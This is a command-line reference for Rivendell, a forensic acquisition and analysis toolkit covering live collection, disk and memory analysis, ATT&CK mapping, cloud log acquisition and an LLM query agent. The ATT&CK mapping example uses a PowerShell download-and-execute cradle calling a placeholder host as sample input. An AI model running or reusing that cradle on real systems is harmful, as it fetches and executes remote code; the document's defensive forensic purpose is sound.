# Rivendell CLI Reference

**Version:** 2.1.0

Every command below runs from the repository root. The Python modules are run with `python3 -m src.analysis.…`. Don't run them from inside `src/analysis`: Elrond's `platform/` package shadows the standard library `platform` module there, so anything that imports numpy or pandas loads `elrond.py` and fails on its arguments.

---

## Table of Contents

1. [Overview](#overview)
2. [Gandalf - Acquisition](#gandalf---acquisition)
3. [Elrond - Analysis](#elrond---analysis)
4. [MITRE ATT&CK Tools](#mitre-attck-tools)
5. [Cloud Forensics](#cloud-forensics)
6. [AI Agent](#ai-agent)
7. [SIEM Integration](#siem-integration)
8. [Utility Commands](#utility-commands)
9. [Configuration](#configuration)
10. [Common Workflows](#common-workflows)

---

## Overview

| Tool | Entry point | Purpose |
|---|---|---|
| Gandalf | `src/acquisition/python/gandalf.py`, `src/acquisition/bash/gandalf.sh`, `src/acquisition/windows/Invoke-Gandalf.ps1` | Live acquisition, local or remote |
| Elrond | `src/analysis/elrond.py` | Collection, processing and analysis of images and acquisitions |
| MITRE tools | `src.analysis.mitre.cli`, `src.analysis.mitre.coverage_cli` | ATT&CK data, technique mapping, coverage |
| Cloud tools | `src.analysis.rivendell.cloud.cli` | AWS, Azure and GCP acquisition and log analysis |
| AI tools (Eru) | `src.analysis.rivendell.ai.cli` | Natural-language queries over case output |

The web UI and API (see [API.md](API.md)) drive Elrond through the same command line.

---

## Gandalf - Acquisition

### Overview

Gandalf collects artefacts from a live host into a zip archive, optionally encrypted, with a SHA-256 audit log for chain of custody.

| Variant | Path | Runs on |
|---|---|---|
| Python | `src/acquisition/python/gandalf.py` | Linux, macOS |
| Bash | `src/acquisition/bash/gandalf.sh` | Linux, Unix |
| PowerShell | `src/acquisition/windows/Invoke-Gandalf.ps1` | Windows |

---

### Python Syntax

```bash
sudo python3 src/acquisition/python/gandalf.py ENCRYPTION ACQUISITION [OPTIONS]
```

- `ENCRYPTION`: `Key` (recommended; generates a key file), `Password` (key derived with PBKDF2) or `None`
- `ACQUISITION`: `Local` or `Remote`

| Option | Does |
|---|---|
| `-O, --OutputDirectory [DIR]` | Where to write the archive |
| `-M, --Memory` | Acquire live memory (AVML on Linux, osxpmem on macOS) |
| `-A, --AccessTimes` | Record last-access times for every file |
| `-F, --CollectFiles` | Collect files whose names match entries in `lists/files.list` |

Remote mode reads target hosts from `src/acquisition/lists/hosts.list` (lines starting `#` are skipped) and prompts for each host's IP address, username and password over SSH. Run it from `src/acquisition/`, because the script opens `lists/` and `tools/` relative to the current directory.

```bash
cd src/acquisition

# Local, key-encrypted, with memory
sudo python3 python/gandalf.py Key Local -M -O /evidence/CASE-001

# Remote, password-encrypted; hosts come from lists/hosts.list
sudo python3 python/gandalf.py Password Remote -O /evidence/CASE-001
```

Decrypt an archive with `python3 src/acquisition/python/passkey_decrypt.py`.

---

### Bash Syntax

```bash
sudo ./src/acquisition/bash/gandalf.sh ENCRYPTION MODE [OPTIONS]
```

| Option | Does |
|---|---|
| `-o DIR` | Output directory (default `/tmp/gandalf/acquisitions`) |
| `-m` | Acquire memory |
| `-a` | Collect access times |
| `-c` | Collect files listed in `files.list` |
| `-h HOST`, `-u USER` | Remote host and user |
| `-f FILE` | Hosts file for batch remote acquisition |

```bash
sudo ./src/acquisition/bash/gandalf.sh None Local
sudo ./src/acquisition/bash/gandalf.sh Password Local -m -o /evidence
sudo ./src/acquisition/bash/gandalf.sh Key Remote -h 192.168.1.100 -u analyst
```

---

### PowerShell Syntax

```powershell
.\src\acquisition\windows\Invoke-Gandalf.ps1 -EncryptionObject Key -Acquisition Local `
  -OutputDirectory C:\TEMP\gandalf\gandalf -Memory -ShowProgress -CollectFiles
```

`-EncryptionObject` takes `Key`, `Password` or `None`; `-Acquisition` takes `Local` or `Remote`. With no arguments it runs `-EncryptionObject None -Acquisition Local -OutputDirectory C:\TEMP\gandalf\gandalf`.

---

### Output Structure

```
<host>.zip            # or <host>.zip.enc when encrypted
├── artefacts/
│   ├── host.info     # system information
│   ├── <host>.mem    # memory (Linux); mem.aff4 / mem.raw on macOS
│   └── …             # logs, plists, registry, browser and user artefacts by type
├── log.audit         # SHA-256 of every acquired file
└── log.meta          # acquisition metadata
```

Gandalf encrypts with Fernet (AES-128-CBC with HMAC-SHA256). Pass the archive to Elrond with `--Gandalf`.

---

## Elrond - Analysis

### Overview

Elrond automates forensic analysis of acquired evidence, processing artifacts through multiple analysis phases.

### Syntax

```bash
python3 src/analysis/elrond.py CASE_ID SOURCE_DIR [DEST_DIR] [OPTIONS]
```

- `CASE_ID`: case or incident identifier
- `SOURCE_DIR`: directory holding the evidence (disk and memory images, Gandalf archives or Mordor datasets)
- `DEST_DIR`: output directory (default: current directory)

Elrond defines long options only. argparse accepts any unambiguous prefix (`--Coll` for `--Collect`), but there are no single-letter flags. The web UI and API build the same command (`build_elrond_command` in `src/web/backend/tasks_docker.py`).

Memory analysis reads memory images from `SOURCE_DIR` alongside the disk images; there is no separate memory path option.

---

### Evidence Sources

| Option | Reads |
|---|---|
| `--Collect` | Disk and memory images (E01, raw/dd, VMDK, VHD/VHDX); Elrond mounts them and collects artefacts |
| `--Gandalf` | Archives acquired with Gandalf |
| `--Mordor` | OTRF Mordor attack-simulation datasets |

---

### Modes

| Option | Enables |
|---|---|
| `--Brisk` | `--Analysis`, `--extractIocs`, `--Navigator`, `--Process`, `--Userprofiles` |
| `--ThreatHunt` | Aggressive threat hunting: `--Analysis`, `--extractIocs`, `--Memory`, `--Navigator`, `--Process` and more; needs the SIEM services up |
| `--eXhaustive` | Every option: Brisk plus `--Delete`, `--Elastic`, `--Memory`, `--nsrl`, `--Splunk`, `--Timeline`, `--memorytimeline` |

`--Brisk` is not faster than a plain run: it adds analysis and IOC extraction. See [PERFORMANCE.md](PERFORMANCE.md) for what each option costs.

---

### Options

**Phases**

| Option | Does |
|---|---|
| `--Process` | Parse collected artefacts (always runs) |
| `--Analysis` | Automated analysis: extended attributes, ADS, timestomping and more |
| `--Memory` | Volatility 3 analysis of memory images |
| `--Timeline` | Plaso timeline of the disk image. Very slow (105 min on a 12 GB E01) |
| `--memorytimeline` | Volatility timeliner on memory images |

**Collection and processing**

| Option | Does |
|---|---|
| `--vss` | Collect and process every Volume Shadow Copy. Each copy costs about as much as the live volume |
| `--Userprofiles` | Collect user profile artefacts |
| `--collectFiles [FILTER]` | Collect files by type (binaries, documents, scripts, …); optional inclusion/exclusion file. Selecting all types includes carving |
| `--symlinks` | Follow symbolic links when copying folders. Slow |
| `--extractIocs` | Extract IOCs from processed files. Slow |
| `--iocsFile FILE` | Match extracted IOCs against a watchlist |
| `--Keywords FILE` | Search for keywords. Remove blank and `#` lines first: they match every line |
| `--Yara DIR` | Scan with YARA rules, against the whole mounted image or only collected files. Symbolic links are not followed (`yara -N`) |
| `--misplacedBinaries` | Find Windows system binaries in unexpected locations (**T1036.005**) |
| `--masquerading` | RLO characters, double extensions, trailing spaces, renamed utilities (**T1036**) |
| `--magicBytes` | Verify file signatures |

**Hashing**

| Option | Does |
|---|---|
| `--hashCollected` | Hash collected and processed artefacts and their metadata |
| `--hashAll` | Hash every file on the mounted images |
| `--metacollected` | Hash and extract metadata only for collected artefacts |
| `--nsrl` | Compare hashes against NSRL known-goods (needs Internet access) |

**Output**

| Option | Does |
|---|---|
| `--Splunk` | Index output into the local Splunk instance |
| `--Elastic` | Index output into the local Elasticsearch instance |
| `--Navigator` | Build an ATT&CK Navigator layer (requires `--Splunk`) |
| `--Ziparchive` | Zip raw data after processing |
| `--Delete` | Delete raw data after processing |

SIEM options fail fast if the service is unreachable. Start them with `docker compose --profile siem up -d`.

---

### Examples

```bash
# Collect and process a disk image
python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Process

# Add analysis
python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Process --Analysis

# Disk and memory together (both images in /evidence)
python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Process --Analysis --Memory

# Brisk mode
python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Brisk

# IOC extraction and YARA
python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 \
  --Collect --Process --Analysis --extractIocs --Yara /opt/yara-rules

# Shadow copies and user profiles
python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Process --vss --Userprofiles

# SIEM export with Navigator layer
python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 \
  --Collect --Process --Analysis --Splunk --Elastic --Navigator
```

---

### Output Structure

Elrond writes one directory per case, with one subdirectory per image. Taken from the October 2026 test runs:

```
<output>/<case>/
├── rivendell_audit.log            # CSV: timestamp (UTC), image, stage, entry
├── mitre_techniques.txt           # ATT&CK techniques identified
├── <case>_navigator.json          # ATT&CK Navigator layer (if -N)
├── .memory_profiles.json          # memory jobs only
├── <disk image>/
│   ├── artefacts/
│   │   ├── raw/                   # collected files, as found on the image
│   │   ├── cooked/                # parsed artefacts
│   │   │   ├── registry/  evt/  browsers/  jumplists/
│   │   │   ├── journal_mft.json  shimcache.json  usb.log.json  wbem.json
│   │   └── plaso_timeline.csv     # if -T
│   ├── analysis/                  # written only when there are results
│   │   ├── analysis.csv           # if -A
│   │   ├── iocs.csv               # if -I
│   │   ├── keyword_matches.csv    # if -K
│   │   └── yara.csv               # if -Y
│   └── carved/                    # if carving; one folder per file type plus foremost's audit.txt
└── <memory image>/
    └── windows.<plugin>.<Plugin>.json   # one file per Volatility 3 plugin
```

Shadow copies (`--vss`) get their own `<image> (volume shadow copy #N)` entries in the audit log.

---

## MITRE ATT&CK Tools

### Framework and Mapping (`mitre.cli`)

```bash
python3 -m src.analysis.mitre.cli [-v] COMMAND ...
```

| Command | Arguments | Does |
|---|---|---|
| `update` | `[-d enterprise\|mobile\|ics] [-f]` | Download ATT&CK data; `-f` ignores a fresh cache |
| `map` | `ARTIFACT_TYPE [-c CONTEXT] [-d JSON] [-o FILE]` | Map one artefact to techniques |
| `list-artifacts` | `[--detailed]` | List artefact types the mapper knows |
| `info` | `TECHNIQUE_ID [-d DOMAIN] [-o FILE]` | Show a technique |
| `stats` | `[-d DOMAIN] [--detailed]` | Framework statistics |
| `dashboard` | `-i MAPPINGS.json [-o DIR] [-f splunk,elastic,navigator]` | Build dashboards from a mappings file (default output `/tmp/rivendell/dashboards`) |

```bash
python3 -m src.analysis.mitre.cli update
python3 -m src.analysis.mitre.cli map powershell_history -c "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"
python3 -m src.analysis.mitre.cli info T1059.001
```

---

### Coverage Analysis (`mitre.coverage_cli`)

Every command takes `CASE_ID OUTPUT_DIR`.

| Command | Extra arguments | Does |
|---|---|---|
| `init` | — | Start coverage tracking for a case |
| `analyze` | `ARTIFACT_TYPE ARTIFACT_PATH [-c CONTEXT] [-d JSON]` | Add one artefact |
| `batch` | `ARTIFACT_LIST` (CSV: `type,path,context`) | Add many artefacts |
| `report` | `[--detailed]` | Coverage report |
| `stats` | `[--detailed]` | Coverage statistics |
| `dashboard` | `[-o FILE.html]` | Standalone HTML dashboard |
| `export` | `[-f json,csv,html,splunk,elastic] [-o PATH]` | Export coverage data |

```bash
python3 -m src.analysis.mitre.coverage_cli init CASE-001 /output/CASE-001
python3 -m src.analysis.mitre.coverage_cli dashboard CASE-001 /output/CASE-001 -o coverage.html
```

The ATT&CK Navigator layer for a case comes from Elrond (`--Navigator`) or the API (`GET /api/jobs/{job_id}/navigator`), not from these tools.

---

## Cloud Forensics

```bash
python3 -m src.analysis.rivendell.cloud.cli {aws|azure|gcp} COMMAND [OPTIONS]
```

| Command | Options | Does |
|---|---|---|
| `list` | `[-c CREDS] [--region R] [--resource-group G] [--zone Z] [-o FILE]` | List instances |
| `acquire-disk` | `-i INSTANCE [-c CREDS] [--region R] [--resource-group G] [--zone Z] [-o DIR] [--wait]` | Snapshot an instance's disks |
| `acquire-logs` | `[-c CREDS] [--days N \| --start-time ISO --end-time ISO] [-o DIR] [--analyze]` | Pull CloudTrail, Azure Activity or GCP Cloud Logging |
| `analyze-logs` | `-f LOG_FILE [-c CREDS] [-o DIR]` | Analyse acquired logs |

`--region` applies to AWS (and Azure location), `--resource-group` to Azure, `--zone` to GCP.

```bash
python3 -m src.analysis.rivendell.cloud.cli aws list -c aws_creds.json --region eu-west-2
python3 -m src.analysis.rivendell.cloud.cli aws acquire-disk -i i-1234567890abcdef0 -o ./snapshots/AWS-001 --wait
python3 -m src.analysis.rivendell.cloud.cli azure acquire-logs --days 30 -o ./logs/AZURE-001 --analyze
python3 -m src.analysis.rivendell.cloud.cli gcp acquire-disk -i myinstance --zone europe-west2-a -o ./snapshots/GCP-001
```

---

## AI Agent

Eru indexes case output into a vector store and answers questions over it with a local LLM (Ollama by default, or llama.cpp).

```bash
python3 -m src.analysis.rivendell.ai.cli COMMAND ...
```

| Command | Arguments | Does |
|---|---|---|
| `index` | `CASE_ID OUTPUT_DIR [--timeline CSV] [--iocs CSV] [--processes CSV] [--network CSV] [--registry CSV] [--files CSV] [--cloud-logs JSON --cloud-provider P]` | Index a case |
| `query` | `CASE_ID "QUESTION" [--temperature T] [--max-tokens N] [--no-sources] [-o FILE] [-v]` | Ask a question |
| `suggest` | `CASE_ID [-o FILE]` | Suggest investigation paths |
| `summary` | `CASE_ID [--format text\|json\|markdown] [-o FILE]` | Case summary |
| `search` | `CASE_ID "QUERY" [--top-k N]` | Similarity search without the LLM |
| `info` | `CASE_ID` | Show what is indexed |

All commands accept `--llm-type ollama|llamacpp`, `--model-name` (default `llama3`) and, except `index`, `--base-dir` and `--model-path` (llama.cpp). `index` also takes `--device cpu|cuda` for embeddings. Indexes are read from `--base-dir`, default `$RIVENDELL_DATA_DIR` or `/opt/rivendell/data`.

```bash
python3 -m src.analysis.rivendell.ai.cli index CASE-001 /output/CASE-001
python3 -m src.analysis.rivendell.ai.cli query CASE-001 "What PowerShell commands were executed?"
python3 -m src.analysis.rivendell.ai.cli summary CASE-001 --format markdown -o summary.md
```

### Web Interface

```bash
python3 -m src.analysis.rivendell.ai.web_interface
```

It serves the chat UI at `http://localhost:5687/ai/chat/<case>` and JSON endpoints under `/ai/cases/`. Port 5687 is fixed (no option) and is also the frontend container's host port, so stop the frontend first or call `start_server(port=…)` from Python. Settings come from `RIVENDELL_DATA_DIR`, `RIVENDELL_LLM_TYPE` and `RIVENDELL_MODEL_NAME`.

---

## SIEM Integration

There is no standalone SIEM exporter. Splunk and Elastic indexing runs inside Elrond:

```bash
python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Process --Analysis --Splunk --Elastic --Navigator
```

or for a completed web job with `POST /api/jobs/{job_id}/export-siem`. Start the services first with `docker compose --profile siem up -d`; Elrond fails fast if a requested SIEM is unreachable.

| Variable | Used for |
|---|---|
| `SPLUNK_HOST`, `SPLUNK_PORT`, `SPLUNK_USERNAME`, `SPLUNK_PASSWORD` | Splunk management API (default port 8089) |
| `ELASTICSEARCH_HOST`, `ELASTICSEARCH_PORT`, `ELASTIC_USERNAME`, `ELASTIC_PASSWORD` | Elasticsearch |
| `KIBANA_HOST`, `KIBANA_PORT` | Kibana dashboards |

In Docker the worker gets `SPLUNK_HOST`, `SPLUNK_PASSWORD` and `ELASTICSEARCH_HOST` from `docker-compose.yml`. Splunk ingests through file monitors on a fixed `/tmp` path, so case output written elsewhere (an external drive, for example) is indexed in Elastic but not Splunk (known issue).

---

## Utility Commands

### Dependencies and Installation

`src/analysis/cli.py` (the `rivendell-analyze` entry point in `pyproject.toml`) is meant to provide `--check-dependencies`, `--install` and `--version`, but it imports the old `elrond.*` package and fails with `ModuleNotFoundError: No module named 'elrond'`. Until that is fixed, use the Docker worker image, which has every tool installed, or [CONFIG.md](CONFIG.md) for manual installation.

### Database

The web backend's Postgres schema is managed with Alembic (`src/web/backend/alembic/`):

```bash
docker exec rivendell-backend alembic upgrade head
```

### Logs

Each case writes `rivendell_audit.log` (CSV, UTC timestamps) to its output directory. In Docker:

```bash
docker logs rivendell-celery-worker --tail 100   # Elrond and task output
docker logs rivendell-backend --tail 100          # API
```

---

## Configuration

Elrond is configured by its command-line options; there is no config file. The Docker stack is configured in `docker-compose.yml` and the variables in the SIEM and AI sections above. See [CONFIG.md](CONFIG.md) for tool installation and paths.

---

## Common Workflows

### Acquire and Analyse a Live Host

```bash
cd src/acquisition && sudo python3 python/gandalf.py Key Local -M -O /evidence/CASE-001 && cd -
python3 src/analysis/elrond.py CASE-001 /evidence/CASE-001 /output/CASE-001 --Gandalf --Process --Analysis --Memory
python3 -m src.analysis.rivendell.ai.cli index CASE-001 /output/CASE-001
python3 -m src.analysis.rivendell.ai.cli query CASE-001 "What was the initial access vector?"
```

### Triage a Disk Image

```bash
python3 src/analysis/elrond.py TRIAGE-001 /evidence/TRIAGE-001 /output/TRIAGE-001 --Collect --Process --Analysis
```

Add `--extractIocs` only if you can wait: it added 43 minutes on a 12 GB Windows E01 and 71 on a 21 GB Linux image ([PERFORMANCE.md](PERFORMANCE.md)).

### Cloud Logs

```bash
python3 -m src.analysis.rivendell.cloud.cli aws acquire-logs --days 7 -o ./logs/AWS-001 --analyze
python3 -m src.analysis.rivendell.ai.cli index AWS-001 ./logs/AWS-001 --cloud-logs ./logs/AWS-001/cloudtrail.json --cloud-provider aws
```

### Several Images

Elrond processes every image it finds in `SOURCE_DIR` as one case. For separate cases, give each image its own directory and run them one after another, not in parallel: concurrent runs share `/mnt/elrond_mountNN` and unmount each other's images.

```bash
for dir in /evidence/*/; do
  case_id=$(basename "$dir")
  python3 src/analysis/elrond.py "$case_id" "$dir" "/output/$case_id" --Collect --Process --Analysis
done
```

---

## Troubleshooting

**`unrecognized arguments` from a `-m` module.** You ran it from inside `src/analysis`. Run it from the repository root (see the top of this page).

**A Linux image finishes in seconds with no output.** Loop devices leaked from an earlier run. Check `losetup -a` and release them with `kpartx -d` and `losetup -d` when nothing else is mounted.

**A job seems stalled.** Several steps log nothing for 30 minutes or more: foremost, Plaso, end-of-collection clean-up and the result statistics. Check the processes before cancelling; see [TEST_RUNNER_GUIDE.md](../tests/docs/TEST_RUNNER_GUIDE.md#long-silent-stretches).

**Mount permission errors.** Image mounting needs root or the privileged worker container.

**AI agent cannot reach the model.** Check Ollama with `ollama list`, then start it with `ollama serve`.

---

## Getting Help

```bash
python3 src/analysis/elrond.py --help
python3 src/acquisition/python/gandalf.py --help
python3 -m src.analysis.rivendell.ai.cli --help
python3 -m src.analysis.rivendell.cloud.cli --help
python3 -m src.analysis.mitre.cli --help
```

- [API Reference](API.md)
- [Usage Guide](USAGE.md)
- [Quick Start](QUICKSTART.md)
- [Security](SECURITY.md)
- GitHub Issues: https://github.com/cmdaltr/rivendell/issues

---

**Version:** 2.1.0
**Last Updated:** 2026-10-22
**License:** See LICENSE file
